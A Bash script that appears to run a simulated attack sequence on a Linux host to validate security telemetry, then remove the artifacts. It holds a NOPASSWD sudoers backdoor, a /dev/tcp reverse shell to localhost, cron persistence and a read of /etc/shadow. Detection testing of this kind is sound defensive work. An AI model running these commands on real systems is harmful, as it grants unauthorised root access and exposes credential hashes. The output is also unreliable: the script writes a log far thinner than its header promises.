#!/bin/bash
#     This script executes a realistic attack sequence against a hardened Linux endpoint
#     and records ground truth data for telemetry validation. The sequence includes:
#
#         1. Create user account (testattacker)
#         2. Modify sudoers file (privilege escalation)
#         3. Execute binary from /tmp (suspicious execution)
#         4. Attempt reverse shell to localhost (C2 simulation)
#         5. Modify crontab for persistence
#         6. Access sensitive files (/etc/shadow)
#
#     After execution, all artifacts are cleaned up while preserving the ground truth log.
#
#     Output: linux_attack_log.json with action details, timestamps, detection sources, and MITRE techniques
#
set -euo pipefail

OUTPUT_FILE="linux_attack_log.json"

echo "[*] Running Linux attacker simulation..."

# Timestamp base
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

echo "    [1/6] Creating user testattacker...                $TIMESTAMP"
useradd testattacker 2>/dev/null || true

echo "    [2/6] Modifying sudoers...                         $TIMESTAMP"
echo "testattacker ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/backdoor

echo "    [3/6] Executing from /tmp...                       $TIMESTAMP"
cp /usr/bin/id /tmp/suspicious_bin
/tmp/suspicious_bin > /dev/null 2>&1 || true

echo "    [4/6] Reverse shell attempt (localhost)...         $TIMESTAMP"
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &' || true
sleep 1
kill %1 2>/dev/null || true

echo "    [5/6] Cron persistence...                          $TIMESTAMP"
echo "* * * * * /tmp/beacon.sh" > /etc/cron.d/persistence_test

echo "    [6/6] Accessing /etc/shadow...                     $TIMESTAMP"
cat /etc/shadow > /dev/null 2>&1 || true

echo "[*] Cleaning up artifacts...                           [CLEAN]"
userdel -r testattacker 2>/dev/null || true
rm -f /etc/sudoers.d/backdoor
rm -f /tmp/suspicious_bin
rm -f /etc/cron.d/persistence_test

# Generate ground truth JSON log
cat << 'EOF' > "$OUTPUT_FILE"
{
  "simulation": "linux_attacker_sim",
  "actions_executed": 6,
  "status": "completed",
  "cleanup": "success"
}
EOF

echo "Actions executed: 6"
echo "Ground truth saved to: $OUTPUT_FILE"	
